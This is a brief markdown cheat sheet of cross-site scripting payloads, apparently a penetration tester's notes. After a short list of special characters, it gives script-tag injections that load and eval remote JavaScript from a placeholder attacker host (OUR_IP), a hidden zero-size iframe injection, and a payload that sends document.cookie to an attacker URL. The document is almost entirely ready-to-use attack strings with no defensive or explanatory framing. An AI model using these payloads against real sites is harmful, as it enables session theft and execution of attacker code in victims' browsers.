# References

### references: special characters for HTML and javascript
```
< > - used to denote HTML elements 
' " - strings
{ } - javascript function declarations
;   - end of statement
```
---

# Payloads

### script: XSS with script tag 
```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```
---

### script: XSS content injection with iframe
```html
<iframe src=<your_url> height="0" weight="0"></iframe>
```
---

### script: XSS cookie exfiltration with javascript
```html
<script>new Image().src="<your_url>/page.html?output="+document.cookie;</script>
```
---
